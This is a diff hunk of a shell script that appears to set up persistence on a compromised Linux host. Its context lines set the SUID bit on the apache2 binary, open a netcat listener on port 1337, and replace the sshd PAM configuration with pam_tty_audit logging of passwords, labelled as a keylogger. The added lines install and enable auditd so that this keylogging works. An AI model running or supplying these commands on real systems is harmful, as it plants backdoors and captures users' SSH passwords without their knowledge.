@@ -21,6 +21,9 @@ chmod u+s /usr/sbin/apache2
 nc -lvp 1337 &
 #Install keylogger
 cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
+#Install auditd to make sure this works
+apt install auditd
+systemctl enable auditd
 echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" > /etc/pam.d/sshd
 systemctl restart sshd
 systemctl restart auditd
